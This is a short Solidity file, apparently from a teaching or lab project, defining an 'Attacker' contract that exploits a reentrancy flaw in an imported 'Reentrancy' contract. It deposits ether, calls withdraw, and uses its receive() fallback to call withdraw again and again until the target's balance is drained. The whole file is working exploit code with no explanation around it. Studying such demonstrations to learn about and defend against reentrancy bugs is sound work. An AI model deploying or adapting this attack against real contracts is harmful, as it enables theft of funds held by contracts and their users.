// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./reentrancy.sol";

contract Attacker {
    
    address payable reentrancyContract  ;

    constructor(address _reentrancyAddress) {
        reentrancyContract = payable(_reentrancyAddress);
    }

    function deposit() external payable {

        Reentrancy(reentrancyContract).deposit{value: msg.value}();

        attack();
        
    }

    function attack() public {
        Reentrancy(reentrancyContract).withdraw();
    }

    
    receive() payable external {
        if(reentrancyContract.balance > 0){
            attack();
        }
    }

}